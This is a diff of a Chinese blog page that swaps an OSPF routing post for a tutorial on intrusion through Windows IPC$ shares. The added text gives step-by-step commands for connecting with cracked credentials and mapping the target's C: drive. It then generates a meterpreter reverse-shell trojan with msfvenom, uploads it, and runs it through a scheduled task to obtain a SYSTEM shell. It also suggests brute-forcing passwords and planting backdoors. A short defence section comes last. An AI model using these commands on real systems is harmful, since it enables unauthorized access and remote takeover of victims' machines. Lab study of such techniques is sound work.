@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="OSPF动态路由协议, share;diary; experience;">
+    <meta name="keywords" content="ipc$命令管道入侵示例, share;diary; experience;">
     <meta name="description" content="the world&#39;s full of lonely people afraid to make the first move.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>OSPF动态路由协议 | Grosad-BLOG</title>
+    <title>ipc$命令管道入侵示例 | Grosad-BLOG</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/libs/awesome/css/all.css">
@@ -344,12 +344,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627000547.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--4.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">OSPF动态路由协议</h1>
+                    <h1 class="description center-align post-title">ipc$命令管道入侵示例</h1>
                 </div>
             </div>
         </div>
@@ -466,12 +466,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%94%B6%E5%BD%95/">
-                                <span class="chip bg-color">收录</span>
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络空间安全</span>
                             </a>
                         
-                            <a href="/tags/%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA/">
-                                <span class="chip bg-color">网络搭建</span>
+                            <a href="/tags/%E6%95%99%E7%A8%8B/">
+                                <span class="chip bg-color">教程</span>
                             </a>
                         
                     </div>
@@ -482,8 +482,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA/" class="post-category">
-                                网络搭建
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络空间安全
                             </a>
                         
                     </div>
@@ -516,50 +516,94 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="网络搭建—OSPF动态路由协议"><a href="#网络搭建—OSPF动态路由协议" class="headerlink" title="网络搭建—OSPF动态路由协议"></a>网络搭建—OSPF动态路由协议</h1><blockquote>
-<p>实验平台: Cisco Packet Tracer 7.3.0</p>
+                <h2 id="IPC-入侵示例"><a href="#IPC-入侵示例" class="headerlink" title="IPC$入侵示例"></a>IPC$入侵示例</h2><blockquote>
+<p>IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它是为了让<a href="https://baike.baidu.com/item/进程间通信" target="_blank" rel="noopener">进程间通信</a>而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 IPC$ 是 NT/2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。 NT/2000 在提供了  ipc$ 功能的同时，在初次<a href="https://baike.baidu.com/item/安装系统" target="_blank" rel="noopener">安装系统</a>时还打开了<a href="https://baike.baidu.com/item/默认共享" target="_blank" rel="noopener">默认共享</a>，即所有的逻辑共享 (c$,d$,e$ …… ) 和系统目录 winnt 或 windows(admin$) 共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。</p>
 </blockquote>
-<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627000547.png" alt></p>
-<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R1</p>
-<pre><code>en
-config
-int f0/0
-no shutdown
-ip add 192.168.1.1 255.255.255.0
-int s0/0/0
-no shutdown
-ip add 192.168.3.1 255.255.255.0
-exit
-ip routing
-route ospf 1
-network 192.168.1.0 0.0.0.255 area 0
-network 192.168.3.0 0.0.0.255 area 0</code></pre><p>R2</p>
-<pre><code>en
-config
-int s0/0/0
-no shutdown
-ip add 192.168.3.2 255.255.255.0
-int s0/0/1
-no shutdown
-ip add 192.168.4.2 255.255.255.0
-exit
-ip routing
-route ospf 1
-network 192.168.4.0 0.0.0.255 area 0
-network 192.168.3.0 0.0.0.255 area 0</code></pre><p>R3</p>
-<pre><code>en
-config
-int s0/0/0
-no shutdown
-ip add 192.168.4.1 255.255.255.0
-int f0/0
-no shutdown
-ip add 192.168.2.1 255.255.255.0
-exit
-ip routing
-route ospf 1
-network 192.168.2.0 0.0.0.255 area 0
-network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627000520.png" alt></p>
+<p>入侵条件：<strong>拥有对方机器的用户名和密码</strong></p>
+<p>关于破解用户名密码等请参考文章，<strong>这里不再赘述</strong>！</p>
+<p>但是因为ipc$的dos命令登录特殊性，<strong>你甚至可以编写批处理进行暴力破解！</strong></p>
+<p>渗透机：Kali Linux 2019.3版本   WindowsXP</p>
+<p>靶机：metasploitable3-win2k8</p>
+<pre><code>net use \\目标ip\ipc$ 用户密码 /user:用户名   建立空连接
+net use z: \\目标ip\c$ 用户密码 /user:用户名  将对方的C盘映射到自己的Z盘中
+net use \\目标IP\ipc$ /del                  删除一个ipc$连接
+net use z: /del                            删除映射的z盘
+//这些都是DOS命令</code></pre><p>这里在破解到该用户的登录密码后，开始尝试建立空连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--1.png" alt></p>
+<p>成功建立了空连接</p>
+<p>这里尝试对对方的磁盘进行映射</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--2.png" alt></p>
+<p>这里看到，对方的C盘已经映射到左下角的Z盘里了</p>
+<p>这里可以轻易访问\读写对方的磁盘</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--3.png" alt></p>
+<h4 id="已经建立了空连接，开始上传木马"><a href="#已经建立了空连接，开始上传木马" class="headerlink" title="已经建立了空连接，开始上传木马"></a><strong>已经建立了空连接，开始上传木马</strong></h4><p>这里利用Kali Linux中Metasploitble生成一个木马文件</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -i 5 -b &apos;0x00&apos; LHOST=渗透机IP    LPORT=渗透机监听端口 -f exe &gt; 木马名.exe   生成木马
+use exploit/multi/handler   定义监听攻击模块
+set payloads windows/meterpreter/reverset_tcp   设置payload
+set lhost IP    设置渗透机ip
+set lport 端口    设置渗透机监听端口
+exploit   开始监听</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--4.png" alt></p>
+<blockquote>
+<p>如果出现问题请仔细看上图</p>
+</blockquote>
+<p>完成创建，木马默认生成在Kali的根目录下</p>
+<h4 id="开始上传木马"><a href="#开始上传木马" class="headerlink" title="开始上传木马"></a>开始上传木马</h4><pre><code>copy 本地路径 目标粘贴路径   向对方复制文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--5.png" alt></p>
+<p>这里已经成功把生成的木马文件复制到了目标机器上</p>
+<pre><code>at \\目标IP 时间(24h制) 路径   添加计划任务
+at \\目标IP   查看计划任务表</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--6.png" alt></p>
+<p>这里向目标机器添加了计划任务，意思就是2分钟后执行C:\system.exe</p>
+<p>at \目标ip  可以验证计划任务添加情况</p>
+<blockquote>
+<p>这里的时间最好不要设置太近，否则系统会认为是明天的这个时间</p>
+</blockquote>
+<p><strong>2</strong></p>
+<p><strong>分</strong></p>
+<p><strong>钟</strong></p>
+<p><strong>后</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--7.png" alt></p>
+<p>这里可以看到，原在Kali内持续监听的msf已经连接上对应的shell了</p>
+<p>输入shell进入   这里whoami已经看到  拿到了<strong>最高system权限</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--8.png" alt></p>
+<p><strong>当然！建立空连接后上传木马也好，后门开端口也好，方法大同小异</strong></p>
+<p><strong>这里拿到最高权限已经可以准备开后门，留隐藏端口了</strong></p>
+<p>这里补充一点msf中本木马的一些相关命令，可以用的到</p>
+<pre><code>1.基本命令
+help                       查看Meterpreter帮助
+background                 返回，把meterpreter后台挂起
+bgkill                     杀死一个背景 meterpreter 脚本
+bglist                     提供所有正在运行的后台脚本的列表
+bgrun                      作为一个后台线程运行脚本
+channel                    显示活动频道
+sessions -i number         与会话进行交互
+close                      关闭通道
+exit                       终止 meterpreter 会话
+interact id                切换进一个信道
+read                       从通道读取数据
+write                      将数据写入到一个通道
+2.文件系统命令
+upload 本地路径 目标路径      上传文件
+download 目标路径 本地路径    下载文件到本机
+edit 目标路径                编辑文件
+enumdesktops               用户登录数
+//文件系统命令详见Linux基础命令篇</code></pre><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol>
+<li><strong>本地cmd中输入net share</strong></li>
+</ol>
+<p>图9</p>
+<p>然后有几个删几个！</p>
+<pre><code>net share ipc$ /delete
+net share admin$ /delete
+net share c$ /delete</code></pre><ol start="2">
+<li><p><strong>关闭ipc$和默认共享所依赖的:server服务</strong></p>
+<p>控制面板 - 管理工具 - 服务 - server服务 - 属性 - 常规 - 启动类型 - 禁用</p>
+</li>
+<li><p><strong>屏蔽139，445端口</strong></p>
+<p>方法很多，建议百度</p>
+</li>
+<li><p><strong>设置复杂的密码，防止密码被暴力破解</strong></p>
+</li>
+</ol>
+<p>参考文献：</p>
+<p><a href="https://blog.csdn.net/u010984552/article/details/54890187" target="_blank" rel="noopener">https://blog.csdn.net/u010984552/article/details/54890187</a></p>
 
             </div>
             <hr/>
@@ -575,7 +619,7 @@ network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结�
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Grosad</a>
+                    <a href="/about" rel="external nofollow noreferrer">Oscur</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -585,7 +629,7 @@ network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结�
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://grosad.github.io/2020/06/26/OSPF/">http://grosad.github.io/2020/06/26/OSPF/</a>
+                    <a href="http://grosad.github.io/2020/06/26/ipc$/">http://grosad.github.io/2020/06/26/ipc$/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -598,7 +642,7 @@ network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结�
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Grosad</a>
+                    <a href="/about" target="_blank">Oscur</a>
                     !
                 </span>
             </div>
@@ -623,12 +667,12 @@ network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结�
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%94%B6%E5%BD%95/">
-                                    <span class="chip bg-color">收录</span>
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络空间安全</span>
                                 </a>
                             
-                                <a href="/tags/%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA/">
-                                    <span class="chip bg-color">网络搭建</span>
+                                <a href="/tags/%E6%95%99%E7%A8%8B/">
+                                    <span class="chip bg-color">教程</span>
                                 </a>
                             
                         </div>
@@ -799,7 +843,7 @@ network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结�
         repo: 'p',
         owner: 'Grosad',
         admin: "Grosad",
-        id: '2020-06-26T23-55-10',
+        id: '2020-06-26T23-58-58',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -823,9 +867,10 @@ network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结�
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/06/26/ipc$/">
                     <div class="card-image">
@@ -843,9 +888,9 @@ IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -858,6 +903,7 @@ IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -880,18 +926,18 @@ IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/06/26/RIP/">
+                <a href="/2020/06/26/OSPF/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/Grosad/p/image/r2-1.png" class="responsive-img" alt="RIP动态路由协议">
+                        <img src="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627000547.png" class="responsive-img" alt="OSPF动态路由协议">
                         
-                        <span class="card-title">RIP动态路由协议</span>
+                        <span class="card-title">OSPF动态路由协议</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            实验平台Cisco Packet Tracer 7.3.0 RIP动态路由协议  拓扑图   指令
+                            实验平台Cisco Packet Tracer 7.3.0 OSPF动态路由协议  拓扑图   指令
                         
                     </div>
                     <div class="publish-info">
